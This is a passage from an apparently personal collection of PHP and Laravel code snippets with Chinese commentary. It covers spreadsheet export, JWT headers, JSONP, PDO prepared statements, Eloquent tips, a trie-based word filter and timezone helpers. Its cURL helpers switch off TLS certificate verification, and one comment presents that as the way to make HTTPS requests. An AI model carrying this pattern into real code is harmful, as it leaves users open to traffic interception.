collect($this-&gt;getAttributes()); $virtual = $attributes-&gt;only($this-&gt;virtual); $attributes = $attributes-&gt;diffKeys($virtual)-&gt;merge([ $this-&gt;getDataColumn() =&gt; json_encode($virtual-&gt;all()), ]); $this-&gt;setRawAttributes($attributes-&gt;all()); &#125; return parent::save($options); &#125; public function getDataColumn() &#123; static $column; if ($column === null) &#123; $column = defined('static::DATA') ? static::DATA : 'data'; &#125; return $column; &#125;&#125;接着是 Model 实现 User.php，里面激活了 schemaless，并设置了虚拟字段：&lt;?phpnamespace App;use Illuminate\Database\Eloquent\Model;class User extends Model&#123; use Schemaless; protected $virtual = ['name', 'address', 'level']; protected $hidden = ['data'];&#125;最后是 Controller 实现 UsersController.php，里面演示了如何创建和修改：&lt;?phpnamespace App\Http\Controllers;use Illuminate\Http\Request;use App\User;class UsersController extends Controller&#123; public function __construct(User $user) &#123; $this-&gt;user = $user; &#125; public function store() &#123; $user = $this-&gt;user; $user-&gt;name = '老王'; $user-&gt;address = '东北'; $user-&gt;level = 1; $user-&gt;save(); &#125; public function update() &#123; $user = $this-&gt;user-&gt;find(1); $user-&gt;address = '北京'; $user-&gt;save(); &#125;&#125; PhpSpreadsheet 导出图片到 Excel123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118public function export($data) &#123; $spreadsheet = new Spreadsheet(); $sheet = $spreadsheet-&gt;getActiveSheet(); //设置sheet的名字 两种方法 https://learnku.com/articles/26965 $sheet-&gt;setTitle('phpspreadsheet——demo'); $spreadsheet-&gt;getActiveSheet()-&gt;setTitle('Hello'); //设置第一行小标题 $k = 1; $sheet-&gt;setCellValue('A' . $k, '问题'); $sheet-&gt;setCellValue('B' . $k, '选项'); $sheet-&gt;setCellValue('C' . $k, '答案'); $sheet-&gt;setCellValue('D' . $k, '图片'); // 设置个表格宽度 $spreadsheet-&gt;getActiveSheet()-&gt;getColumnDimension('A')-&gt;setWidth(16); $spreadsheet-&gt;getActiveSheet()-&gt;getColumnDimension('B')-&gt;setWidth(80); $spreadsheet-&gt;getActiveSheet()-&gt;getColumnDimension('C')-&gt;setWidth(15); $spreadsheet-&gt;getActiveSheet()-&gt;getColumnDimension('D')-&gt;setWidth(20); // 垂直居中 $spreadsheet-&gt;getActiveSheet()-&gt;getStyle('A')-&gt;getAlignment()-&gt;setVertical(\PhpOffice\PhpSpreadsheet\Style\Alignment::VERTICAL_CENTER); $spreadsheet-&gt;getActiveSheet()-&gt;getStyle('B')-&gt;getAlignment()-&gt;setVertical(\PhpOffice\PhpSpreadsheet\Style\Alignment::VERTICAL_CENTER); $spreadsheet-&gt;getActiveSheet()-&gt;getStyle('C')-&gt;getAlignment()-&gt;setVertical(\PhpOffice\PhpSpreadsheet\Style\Alignment::VERTICAL_CENTER); $spreadsheet-&gt;getActiveSheet()-&gt;getStyle('D')-&gt;getAlignment()-&gt;setVertical(\PhpOffice\PhpSpreadsheet\Style\Alignment::VERTICAL_CENTER); $info = $data; // 设置A单元格的宽度 同理设置每个 $spreadsheet-&gt;getActiveSheet()-&gt;getColumnDimension('A')-&gt;setWidth(20); // 设置第三行的高度 $spreadsheet-&gt;getActiveSheet()-&gt;getRowDimension('3')-&gt;setRowHeight(50); // A1水平居中 $styleArray = [ 'alignment' =&gt; [ 'horizontal' =&gt; \PhpOffice\PhpSpreadsheet\Style\Alignment::HORIZONTAL_CENTER, ], ]; $sheet-&gt;getStyle('A1')-&gt;applyFromArray($styleArray); // 将A3到D4合并成一个单元格 $spreadsheet-&gt;getActiveSheet()-&gt;mergeCells('A3:D4'); // 拆分合并单元格 $spreadsheet-&gt;getActiveSheet()-&gt;unmergeCells('A3:D4'); // 将A2到D8表格边框 改变为红色 $styleArray = [ 'borders' =&gt; [ 'outline' =&gt; [ 'borderStyle' =&gt; \PhpOffice\PhpSpreadsheet\Style\Border::BORDER_THICK, 'color' =&gt; ['argb' =&gt; 'FFFF0000'], ], ], ]; // $sheet-&gt;getStyle('A2:E8')-&gt;applyFromArray($styleArray); // 设置超链接 // $sheet-&gt;setCellValue('D6', 'www.baidu.com'); // $spreadsheet-&gt;getActiveSheet()-&gt;setCellValue('E6', 'www.baidu.com'); // 循环赋值 $k = 2; foreach ($info as $key =&gt; $value) &#123; $sheet-&gt;setCellValue('A' . $k, $value['question']); $sheet-&gt;setCellValue('B' . $k, $value['question_options']); $sheet-&gt;setCellValue('C' . $k, $value['answer']); $img = self::curlGet($value['img']); $dir = public_path('/temp/image/'); $file_info = pathinfo($value['img']); if (!empty($file_info['basename'])) &#123; //过滤非文件类型 $basename = $file_info['basename']; is_dir($dir) OR mkdir($dir, 0777, true); //进行检测文件是否存在 file_put_contents($dir . $basename, $img); $drawing[$k] = new Drawing(); $drawing[$k]-&gt;setName('Logo'); $drawing[$k]-&gt;setDescription('Logo'); $drawing[$k]-&gt;setPath($dir . $basename); $drawing[$k]-&gt;setWidth(80); $drawing[$k]-&gt;setHeight(80); $drawing[$k]-&gt;setCoordinates('D'.$k); $drawing[$k]-&gt;setOffsetX(12); $drawing[$k]-&gt;setOffsetY(12); $drawing[$k]-&gt;setWorksheet($spreadsheet-&gt;getActiveSheet()); &#125; else &#123; $sheet-&gt;setCellValue('D' . $k, ''); &#125; $sheet-&gt;getRowDimension($k)-&gt;setRowHeight(80); $k++; &#125; $file_name = date('Y-m-d', time()) . rand(1000, 9999); // 第一种保存方式 /*$writer = new Xlsx($spreadsheet); //保存的路径可自行设置 $file_name = '../'.$file_name . ".xlsx"; $writer-&gt;save($file_name);*/ // 第二种直接页面上显示下载 $file_name = $file_name . ".xls"; header('Content-Type: application/vnd.ms-excel'); header('Content-Disposition: attachment;filename="' . $file_name . '"'); header('Cache-Control: max-age=0'); $writer = IOFactory::createWriter($spreadsheet, 'Xls'); // 注意createWriter($spreadsheet, 'Xls') 第二个参数首字母必须大写 $writer-&gt;save('php://output'); &#125; public function getClient()&#123; $client = new Client(); return $client; &#125; public static function curlGet($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // 这个是重点 请求https。 $data = curl_exec($ch); curl_close($ch); return $data; &#125; Laravel 集合的 “when” 方法123456789101112131415161718192021222324$hosts = [ ['name' =&gt; 'Eric Barnes', 'location' =&gt; 'USA', 'is_active' =&gt; 0], ['name' =&gt; 'Jack Fruh', 'location' =&gt; 'USA', 'is_active' =&gt; 0], ['name' =&gt; 'Jacob Bennett', 'location' =&gt; 'USA', 'is_active' =&gt; 1], ['name' =&gt; 'Michael Dyrynda', 'location' =&gt; 'AU', 'is_active' =&gt; 1],];以往，如果在一个查询语句上，还要有进一步的过滤条件，你可能需要这样写：$inUsa = collect($hosts)-&gt;where('location', 'USA');if (request('retired')) &#123; $inUsa = $inUsa-&gt;filter(function($employee)&#123; return ! $employee['is_active']; &#125;);&#125;通过 when 方法，你就可以在一个链式查询中完成所有的筛选过滤：https://learnku.com/laravel/t/26331$inUsa = collect($hosts) -&gt;where('location', 'USA') -&gt;when(request('retired'), function($collection) &#123; return $collection-&gt;reject(function($employee)&#123; return $employee['is_active']; &#125;); &#125;); Jwtauth 自定义认证头信息12345678910111213141516171819项目使用的 tymon/jwt-auth 包作为 token 的认证，过程中需要迁移项目，因为之前公司的 token 头部使用自定义的，并且他们还修改了包的头信息。就是下面头部信息。https://learnku.com/articles/26976class AuthHeaders implements ParserContract&#123; // 下面这两处就是被修改的 protected $header = 'authorization'; protected $prefix = 'bearer';&#125;迁移项目过程了，因为拉取了新的包，所以还要去动包的信息，这是极其不合理的行为。所以就在包中尝试找到了更好的解决办法。如果在项目迁移过程中遇到了类似的问题该如何去做呢？这里只提供了我能想到的解决办法。需要在 AppServiceProvider 中加入该方法就可以了。 protected function setAuthHeader() &#123; $chain = $this-&gt;app['tymon.jwt.parser']-&gt;getChain(); $chain[0] = $chain[0]-&gt;setHeaderPrefix('项目的 token 前缀')-&gt;setHeaderName('项目的头信息 key'); $this-&gt;app['tymon.jwt.parser']-&gt;setChain($chain); &#125; ajax 实现跨域123456789101112131415161718192021222324252627282930313233343536$.ajax(&#123; async: true, url: "http://172.16.112.3/api.php", type: "GET", dataType: "jsonp", // 返回的数据类型，设置为JSONP方式 jsonp: 'callback', //指定一个查询参数名称来覆盖默认的 jsonp 回调参数名 callback jsonpCallback: 'handleResponse', //设置回调函数名 success: function (response, status, xhr) &#123; console.log('状态为：' + status + ',状态是：' + xhr.statusText); console.log(response); &#125; &#125;);原生 js 实现跨域 window.onload = function () &#123; function jsonp(obj) &#123; //定义一个处理Jsonp返回数据的回调函数 window["callback"] = function (object) &#123; obj.success(object); &#125; var script = document.createElement("script"); //组合请求URL script.src = obj.url + "?callback=callback"; for (key in obj.data) &#123; script.src += "&amp;" + key + "=" + obj.data[key]; &#125; //将创建的新节点添加到BOM树上 document.getElementsByTagName("body")[0].appendChild(script); &#125; jsonp(&#123; url: "http://172.16.112.3/api.php", success: function (obj) &#123; console.log(obj); &#125; &#125;); &#125; PDO 防止 sql 注入1234567891011121314151617181920setAttribute（） 这一行是强制性的，它会告诉 PDO 禁用模拟预处理语句，并使用 real parepared statements 。这可以确保 SQL 语句和相应的值在传递到 mysql 服务器之前是不会被 PHP 解析的（禁止了所有可能的恶意 SQL 注入攻击）。虽然你可以配置文件中设置 字符集的属性 (charset=utf8)，但是需要格外注意的是，老版本的 PHP（ &lt; 5.3.6）在 DSN 中是忽略字符参数的。我们来看一段完整的代码使用实例：https://learnku.com/articles/27000#topnav $user=$_POST['user']; $pass=$_POST['pass']; $dbh = new \PDO("mysql:host=localhost; dbname=zz", "root", "root"); $dbh-&gt;setAttribute(\PDO::ATTR_EMULATE_PREPARES, false); //禁用prepared statements的仿真效果// $dbh-&gt;exec ("set names 'utf8'"); $sql="select * from test where user=? and pass=?"; $stmt = $dbh-&gt;prepare($sql); $exeres = $stmt-&gt;execute(array($user, $pass)); if ($exeres) &#123; //while条件为真时,输出$row, while ($row = $stmt-&gt;fetch(\PDO::FETCH_ASSOC))&#123; print_r($row);die(); &#125; //失败输出登录失败 print_r("登录失败");die(); &#125;当调用 prepare () 时，查询语句已经发送给了数据库服务器，此时只有占位符？发送过去，没有用户提交的数据；当调用到 execute () 时，用户提交过来的值才会传送给数据库，他们是分开传送的，两者独立的，SQL 攻击者没有一点机会。 Eloquent 关系中使用 orderBy()1234567891011121314151617181920212223242526272829303132333435363738public function productsByName()&#123; return $this-&gt;hasMany(Product::class)-&gt;orderBy('name');&#125;$products = Product::whereDate('created_at', '2018-01-31')-&gt;get(); $products = Product::whereMonth('created_at', '12')-&gt;get(); $products = Product::whereDay('created_at', '31')-&gt;get(); $products = Product::whereYear('created_at', date('Y'))-&gt;get(); $products = Product::whereTime('created_at', '=', '14:13:58')-&gt;get();Route::group(['prefix' =&gt; 'account', 'as' =&gt; 'account.'], function() &#123; Route::get('login', 'AccountController@login'); Route::get('register', 'AccountController@register'); Route::group(['middleware' =&gt; 'auth'], function() &#123; Route::get('edit', 'AccountController@edit'); &#125;);&#125;);恢复多个软删除https://learnku.com/articles/26673 如果记录使用了软删除，那么你就可以一次恢复多条软删除记录。Post::withTrashed()-&gt;where('author_id', 1)-&gt;restore();// Author -&gt; hasMany(Book::class) $authors = Author::has('books', '&gt;', 5)-&gt;get();$users = User::all(['id', 'name', 'email']);在执行 Eloqument 查询后，你可以使用 map() 来修改行。$users = User::where('role_id', 1)-&gt;get()-&gt;map(function (User $user) &#123; $user-&gt;some_column = some_function($user); return $user;&#125;);当一个关系被调用时，如果它不存在，则会出现致命的错误，例如 $post-&gt;user-&gt;name ，可以使用 withDefault() 来避免。/** 获取文章作者 */ public function user() &#123; return $this-&gt;belongsTo('App\User')-&gt;withDefault(); &#125;$users = App\Book::with('author:id,name')-&gt;get(); 开闭原则12345678910111213141516171819202122232425262728293031323334353637383940414243444546 Controller 类，只接受用户输入，返回输出，不需要具体处理背后的事情。当需要表单验证的时候，注入相应的 Request 类。当需要数据操作时，注入相应的 Repository 或 Service 或 Factory。 Model 类，将修改器，访问器定义在 trait 然后 use 进来。数据操作逻辑分离成 Repository。 Helper.php 全局函数，将同类型的 helper 分离成单独的文件，使其高内聚。然后在 Helper.php 中引入所有具体的类都需要实现 Interface 中定义的方法。在 Factory 中实例化具体的类。在 Controller 中使用 Factory。首先创建一个 PaymentInterface，任何支付方式都必须实现此接口中定义的方法。interface PaymentInterface &#123; public function pay();&#125;接着，创建两个实现 PaymentInterface 的具体类。class Alipay implements PaymentInterface &#123; public function pay() &#123; // 支付宝支付具体代码 &#125;&#125;class Wechat implements PaymentInterface &#123; public function pay() &#123; // 微信支付具体代码 &#125;&#125;然后，创建一个支付工厂，此工厂用来实例化具体的支付类class PeymentFactory&#123; public function init($payType) &#123; switch ($payType) &#123; case 'Alipay': return new Alipay(); case 'Wechat': return new Wechat(); &#125; throw new Exception('未知支付方式'); &#125;&#125;最后，在控制器中注入此 Factorypublic function pay (Request $request, PaymentFactory $paymentFactory) &#123; $payment = $paymentFactory-&gt;init($request-&gt;payType); $payment-&gt;pay();&#125; 内存占用高，速度就会提高123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475class a&#123; function __construct()&#123; echo 'class a __construct'."\n"; &#125; function a1()&#123; echo 'a1'."\n"; &#125; function a2()&#123; echo 'a2'."\n"; &#125; function a3()&#123; echo 'a3'."\n"; &#125;&#125;//https://learnku.com/laravel/t/27033class b&#123; protected $cache; function __construct()&#123; echo 'class b __construct'."\n"; &#125; function b1($tags='tags')&#123; return new a(); &#125; function b2($tags='tags')&#123; static $cache=[]; if(isset($cache[$tags])) return $cache[$tags]; return $cache[$tags]=new a(); &#125; function b3($tags='tags')&#123; if(isset($this-&gt;cache[$tags])) return $this-&gt;cache[$tags]; return $this-&gt;cache[$tags]=new a(); &#125;&#125;/*内存计算*/$start = memory_get_usage();$b=new b();$b-&gt;b1()-&gt;a1();$b-&gt;b1()-&gt;a2();$b-&gt;b1()-&gt;a3();/*内存计算*/$end = memory_get_usage();echo ($end-$start)."\n";/*内存计算*/$start = memory_get_usage();$b=new b();$b-&gt;b2()-&gt;a1();$b-&gt;b2()-&gt;a2();$b-&gt;b2()-&gt;a3();/*内存计算*/$end = memory_get_usage();echo ($end-$start)."\n";/*内存计算*/$start = memory_get_usage();$b=new b();$b-&gt;b3()-&gt;a1();$b-&gt;b3()-&gt;a2();$b-&gt;b3()-&gt;a3();/*内存计算*/$end = memory_get_usage();echo ($end-$start)."\n";内存占用高，速度就会提高，反之，就速度就会降低，上面那个 b1 和 b2 后面应该加一个 unset ($b), 内存计算才准确吧这应该就是连接数据库的时候为什么推荐使用短链接而不是长链接的原因吧，长连接占用内存高，资源多吧，不即时释放调用第二个 b1 的时候，第一个 b1 创建出来的 a 就被销毁了啊，就不占内存了啊。这题还有一个目的，在同一个进程下想减少 new 的次数，结果画蛇添足了 关联模型字段取别名查询不出数据123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263https://learnku.com/articles/22489#topnavlaravel 自带的 ORM 是个神器，针对这种有关系的数据，完全可以使用关系模型，既简单又实用，由于这里只有一个数据表，关系也存在于同一张表，所以可以直接使用自关联，将两个关系定义在同一个 Model 里面： ...... public function parent() &#123; return $this-&gt;hasOne($this, 'id', 'parent_id'); &#125; public function children() &#123; return $this-&gt;hasMany($this, 'parent_id', 'id'); &#125;关系定义里面的参数也可以这样写： ...... public function parent() &#123; return $this-&gt;hasOne(get_class($this), $this-&gt;getKeyName(), 'parent_id'); &#125; public function children() &#123; return $this-&gt;hasMany(get_class($this), 'parent_id', $this-&gt;getKeyName()); &#125;查询包含子菜单的数据 return Admin_menu::with(['children' =&gt; function($query)&#123; $query-&gt;select('id', 'title', 'parent_id'); &#125;]) -&gt;select('id', 'title', 'parent_id') -&gt;get();where in （array）这里的 array 是依赖主键的名称的，在关联查询的时候，已经定义了 id = [3,4,5,6...]，但是我们最后给 id 取了别名，变成 MaindId，所以找不到名为 id 的数组。如果真是这样，我们试着再给它加上 id，让它能够找到名为 id 的数组 \DB::connection()-&gt;enableQueryLog(); // 开启查询日志 $menus = Admin_menu::with(['children' =&gt; function($query)&#123; $query-&gt;select('id', 'title', 'parent_id'); &#125;]) -&gt;select('id', 'id as MainId', 'title', 'parent_id') -&gt;get(); foreach (\DB::getQueryLog() as $sql) &#123; dump($sql['query']); &#125; 依赖关联主键 localKey 的查询，不能缺少相应的字段，也就是说 select 应该包含对应 localKey，如果要取别名应该额外添加，形如： select('id', 'id as MainId', 'title', 'parent_id', 'parent_id as extraId')public function test() &#123; $menus = Admin_menu::with(['parent' =&gt; function($query)&#123; $query-&gt;select('id', 'title', 'parent_id'); &#125;]) -&gt;select('id', 'title', 'parent_id') -&gt;get(); return $this-&gt;transformer($menus); &#125; protected function transformer($items) &#123; $data = []; foreach ($items ?? [] as $item) &#123; $data[] = [ 'mainId' =&gt; $item-&gt;id, 'title' =&gt; $item-&gt;title, 'parent_id' =&gt; $item-&gt;parent_id, 'children' =&gt; $item-&gt;children, ]; &#125; return $data; &#125; 敏感词过滤算法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127//https://juejin.im/post/5cb56372f265da037d4fa133class TreeMap&#123; public $data; // 节点字符 public $children = []; // 存放子节点引用（因为有任意个子节点，所以靠数组来存储） public $isEndingChar = false; // 是否是字符串结束字符 public function __construct($data) &#123; $this-&gt;data = $data; &#125;&#125;class TrieTree&#123; /** * 敏感词数组 * * @var array * @author qpf */ public $trieTreeMap = array(); public function __construct() &#123; $this-&gt;trieTreeMap = new TreeMap('/'); &#125; /** * 获取敏感词Map * * @return array * @author qpf */ public function getTreeMap() &#123; return $this-&gt;trieTreeMap; &#125; /** * 添加敏感词 * * @param array $txtWords * @author qpf */ public function addWords(array $wordsList) &#123; foreach ($wordsList as $words) &#123; $trieTreeMap = $this-&gt;trieTreeMap; $len = mb_strlen($words); for ($i = 0; $i &lt; $len; $i++) &#123; $word = mb_substr($words, $i, 1); if(!isset($trieTreeMap-&gt;children[$word]))&#123; $newNode = new TreeMap($word); $trieTreeMap-&gt;children[$word] = $newNode; &#125; $trieTreeMap = $trieTreeMap-&gt;children[$word]; &#125; $trieTreeMap-&gt;isEndingChar = true; &#125; &#125; /** * 查找对应敏感词 * * @param string $txt * @return array * @author qpf */ public function search($txt) &#123; $wordsList = array(); $txtLength = mb_strlen($txt); for ($i = 0; $i &lt; $txtLength; $i++) &#123; $wordLength = $this-&gt;checkWord($txt, $i, $txtLength); if($wordLength &gt; 0) &#123; echo $wordLength; $words = mb_substr($txt, $i, $wordLength); $wordsList[] = $words; $i += $wordLength - 1; &#125; &#125; return $wordsList; &#125; /** * 敏感词检测 * * @param $txt * @param $beginIndex * @param $length * @return int */ private function checkWord($txt, $beginIndex, $length) &#123; $flag = false; $wordLength = 0; $trieTree = $this-&gt;trieTreeMap; //获取敏感词树 for ($i = $beginIndex; $i &lt; $length; $i++) &#123; $word = mb_substr($txt, $i, 1); //检验单个字 if (!isset($trieTree-&gt;children[$word])) &#123; //如果树中不存在，结束 break; &#125; //如果存在 $wordLength++; $trieTree = $trieTree-&gt;children[$word]; if ($trieTree-&gt;isEndingChar === true) &#123; $flag = true; break; &#125; &#125; if($beginIndex &gt; 0) &#123; $flag || $wordLength = 0; //如果$flag == false 赋值$wordLenth为0 &#125; return $wordLength; &#125; &#125;$data = ['白粉', '白粉人', '白粉人嫩','不该大'];$wordObj = new TrieTree();$wordObj-&gt;addWords($data);$txt = "白粉啊,白粉人，我不该大啊";$words = $wordObj-&gt;search($txt);var_dump($words);die; curl https1234567891011121314151617181920212223242526272829303132333435363738394041curl请求https，需要设置ipv4访问，ipv6的话会导致解析不了域名，php代码如下：//请求https需要用ipv4$curl-&gt;setOption(CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);/** * curl POST * * @param string url * @param array 数据 * @param int 请求超时时间 * @param bool HTTPS时是否进行严格认证 * @return string */ function curlPost($url, $data = array(), $timeout = 30, $CA = true)&#123; $cacert = getcwd() . '/cacert.pem'; //CA根证书https://segmentfault.com/a/1190000005856334 $SSL = substr($url, 0, 8) == "https://" ? true : false; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_TIMEOUT, $timeout); curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout-2); if ($SSL &amp;&amp; $CA) &#123; curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // 只信任CA颁布的证书 curl_setopt($ch, CURLOPT_CAINFO, $cacert); // CA根证书（用来验证的网站证书是否是CA颁布） curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2); // 检查证书中是否设置域名，并且是否与提供的主机名匹配 &#125; else if ($SSL &amp;&amp; !$CA) &#123; curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // 信任任何证书 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1); // 检查证书中是否设置域名 &#125; curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:')); //避免data数据过长问题 curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $data); //curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data)); //data with URLEncode $ret = curl_exec($ch); //var_dump(curl_error($ch)); //查看报错信息 curl_close($ch); return $ret; &#125; Laravel-Excel3.0123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990composer require maatwebsite/excelapp/app 注册服务及门面：'providers' =&gt; [ Maatwebsite\Excel\ExcelServiceProvider::class,]'aliases' =&gt; [ 'Excel' =&gt; Maatwebsite\Excel\Facades\Excel::class,]php artisan vendor:publish创建 app/exports/export.php&lt;?phpnamespace App\Exports;use Maatwebsite\Excel\Concerns\FromCollection;use Maatwebsite\Excel\Concerns\WithHeadings; //设置标题use Maatwebsite\Excel\Concerns\ShouldAutoSize; //自动单元格尺寸use PhpOffice\PhpSpreadsheet\Style\NumberFormat; //设置单元格数据格式use Maatwebsite\Excel\Concerns\WithColumnFormatting; //设置列格式use Maatwebsite\Excel\Concerns\WithStrictNullComparison; //为空时零填充class InvoicesExport implements FromCollection,WithHeadings,WithStrictNullComparison,WithColumnFormatting,ShouldAutoSize&#123; protected $data; protected $header; /* * Excel类的构造函数 */ public function __construct($data, $header) &#123; $this-&gt;data = $data; $this-&gt;header = $header; &#125; //导出数据逻辑 public function collection() &#123; return $this-&gt;data; &#125; //首行标题 public function headings(): array &#123; return $this-&gt;header; &#125; //设置列格式 public function columnFormats(): array &#123; return [ //'E' =&gt; NumberFormat::FORMAT_DATE_XLSX14, ]; &#125;&#125;控制器中使用：public function export()&#123; $data = Post::get(); $header = [ 'ID', '姓名', '年龄', '性别', '创建时间', '修改时间']; return \Excel::download(new InvoicesExport($data, $header), "测试导出.xls");&#125;创建 app/Exports/Import.php&lt;?phpnamespace App\Exports;use Maatwebsite\Excel\Concerns\ToArray;class Import implements ToArray&#123; //重新父类实现public function array(array $array)&#123; return $array;&#125;&#125;控制器使用：https://learnku.com/articles/26940public function import(Request $request)&#123; $file = $request-&gt;file('file'); $data = \Excel::toArray(new Import(), $file); dd($data);&#125; 数据填充功能生成中文测试数据1234567891011121314151617181920212223242526$factory-&gt;define(App\Product::class, function (Faker\Generator $faker) &#123; return [ 'user_id' =&gt; 1, 'name' =&gt; $faker-&gt;name, 'mobile' =&gt; $faker-&gt;phoneNumber, 'province' =&gt; $faker-&gt;state, 'city' =&gt; $faker-&gt;city, 'area' =&gt; $faker-&gt;area, 'address' =&gt; $faker-&gt;streetAddress, 'postcode' =&gt; $faker-&gt;postcode, ];&#125;);$factory-&gt;define(App\Address::class, function () &#123; $faker = Faker\Factory::create('zh_CN');//在 config\app.php 文件中加入 faker_locale =&gt; 'zh_CN' 就可以实现了//https://tianyong90.com/2019/03/10/shi-yong-laravel-shu-ju-tian-chong-gong-neng-sheng-cheng-zhong-wen-ce-shi-shu-ju/ return [ 'user_id' =&gt; 1, 'name' =&gt; $faker-&gt;name, 'mobile' =&gt; $faker-&gt;phoneNumber, 'province' =&gt; $faker-&gt;state, 'city' =&gt; $faker-&gt;city, 'area' =&gt; $faker-&gt;area, 'address' =&gt; $faker-&gt;streetAddress, 'postcode' =&gt; $faker-&gt;postcode, ];&#125;); intervention/image 坑1234567891011121314151617181920212223242526272829// 记录开始时间$startTimestamp = microtime(true);$url = 'http://wx.qlogo.cn/mmopen/XxT9TiaJ1ibf06TNRCMjQADS4opDHvQLguLZHpqkRlvuJYZicvJW4iaOalPsKIs0kpZ3F6864ZzibyObYiaucUQSrdp4pFTNDyIpxw/0';$avatar = \Image::make($url);// 记录结束时间$endTimestamp = microtime(true);info($startTimestamp);info($endTimestamp);info($endTimestamp - $startTimestamp);$startTimestamp = microtime(true);$client = new \GuzzleHttp\Client();$url = 'http://wx.qlogo.cn/mmopen/XxT9TiaJ1ibf06TNRCMjQADS4opDHvQLguLZHpqkRlvuJYZicvJW4iaOalPsKIs0kpZ3F6864ZzibyObYiaucUQSrdp4pFTNDyIpxw/0';$avatarResponse = $client-&gt;get($url);$avatar = \Image::make($avatarResponse-&gt;getBody()-&gt;getContents());$endTimestamp = microtime(true);info($startTimestamp);info($endTimestamp);info($endTimestamp - $startTimestamp);先使用 GuzzleHttp 获取头像，再使用 Image::make($data) 创建头像。 puppeteer 采集异步加载的网页内容1234567891011121314151617181920212223242526272829303132$ composer require spatie/browsershot$ npm i puppeteer --savehttps://tianyong90.com/2019/03/10/laravel-zhong-shi-yong-puppeteer-cai-ji-yi-bu-jia-zai-de-wang-ye-nei-rong/#安装use Spatie\Browsershot\Browsershot;public function getBodyHtml()&#123; $newsUrl = 'https://m.toutiao.com/i6546884151050502660/'; $html = Browsershot::url($newsUrl) -&gt;windowSize(480, 800) -&gt;userAgent('Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Mobile Safari/537.36') -&gt;mobile() -&gt;touch() -&gt;bodyHtml(); \Log::info($html);&#125;use Spatie\Browsershot\Browsershot;public function getBodyHtml()&#123; $newsUrl = 'https://m.toutiao.com/i6546884151050502660/'; Browsershot::url($newsUrl) -&gt;windowSize(480, 800) -&gt;userAgent('Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Mobile Safari/537.36') -&gt;mobile() -&gt;touch() -&gt;setDelay(1000) -&gt;save(public_path('images/toutiao.jpg'));&#125; PHP时区1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581，北京英国标准时间时差是8小时。2，英国伦敦使用夏令时（夏时制）时时差是7小时。北京时间为东八区的区时UTC+8，英国伦敦为零时区的区时UTC+0，两者时差为8小时；当英国为夏时制时（提前一小时），时区变为UTC+1，两者时差为7小时。英国夏令时的区间：从3月最后一个星期日到10月最后一个星期日。参考：http://baike.baidu.com/view/37429.htm时差的计算方法：两个时区标准时间（即时区数）相减就是时差，时区的数值大的时间早。比如中国是东八区(+8)，美国东部是西五区(-5)，两地的时差是13小时，北京比纽约要早13个小时；如果是美国实行夏令时的时期，相差12小时。英国与北京时间的时差是8个小时，但其中英国属于夏令时国家，如果是夏令时（每年3月最后一个星期日至10月最后一个星期日）期间，中国和英国的时差是7个小时。1884年在华盛顿召开的一次国际子午线会议上，规定将全球划分为24个时区（东、西各12个时区），且同时规定了英国为为本初子午线，即零度经线。东1-12区，西1-12区，每个时区横跨经度15度，时间正好是1小时。最后的东、西第12区各跨经度7.5度，以东、西经180度为界。中国首都北属于东八区，所以对比英国的零度经线，两者之间相差了8个小时。但因为英国实行夏令时（每年3月最后一个星期日至10月最后一个星期日），则英国在天亮早的夏季人为将时间调快一小时可以使人早起早睡，减少照明量。那么英国与北京时间之间时差是7个小时。//获取美国冬夏时令 //判断当前是否为夏令时，为真返回1，否则为0function getAmericanSeason($market)&#123; $localzone = date("e"); //date_default_timezone_set('US/Pacific-New'); $timezone = in_array($market, array('LME', 'LIFFE')) ? 'Europe/London' : 'US/Pacific-New'; $season = date("I"); date_default_timezone_set($localzone); return $season;&#125;//判断美国那个时间段是否为夏令时https://gist.github.com/flowerains function is_dst($timestamp)&#123; $timezone = date('e'); //获取当前使用的时区 date_default_timezone_set('US/Pacific-New'); //强制设置时区 $dst = date('I',$timestamp); //判断是否夏令时 date_default_timezone_set($timezone); //还原时区 return $dst; //返回结果&#125;print gmdate("Y-m-d\TH:i:s\Z");$date_utc = new \DateTime("now", new \DateTimeZone("UTC"));https://stackoverflow.com/questions/8655515/get-utc-time-in-php/18808833echo $date_utc-&gt;format(\DateTime::RFC850); # Saturday, 18-Apr-15 03:23:46 UTCecho gmdate ("l d F Y H:i:s")." GMT"; //输出: Wednesday 09 April 2014 03:53:36 GMTGMT格林威治时间和本地的时间是有时差的, 我们知道php指定时区后用date() 函数获取的是本地时间, 如果想获取标准的GMT 格林威治时间就要用gmdate()函数了/** * Converts a local Unix timestamp to GMT * * @param int Unix timestamp * @return int */ function local_to_gmt($time = '') &#123; if ($time === '') &#123; 